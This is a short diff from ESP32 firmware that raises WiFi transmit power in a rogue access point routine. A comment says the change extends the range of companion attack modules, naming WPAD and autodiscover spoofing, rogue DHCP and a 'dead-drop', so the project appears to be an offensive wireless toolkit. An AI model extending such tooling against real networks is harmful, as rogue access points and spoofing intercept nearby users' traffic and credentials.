@@ -84,6 +84,10 @@ bool wifi_raw_ap_up(const char *ssid, uint8_t channel,
         esp_wifi_deinit();
         return false;
     }
+    /* Bug 11: bump TX power so consumers (net_attacks dead-drop, WPAD,
+     * autodiscover, rogue DHCP) all broadcast at realistic range. 78 =
+     * 19.5 dBm in 0.25 dBm units. */
+    esp_wifi_set_max_tx_power(78);
     /* Some builds ignore the channel in the config struct; force it. */
     esp_wifi_set_channel(apc.ap.channel, WIFI_SECOND_CHAN_NONE);
     /* Settle window — AP_START event needs to fully process before
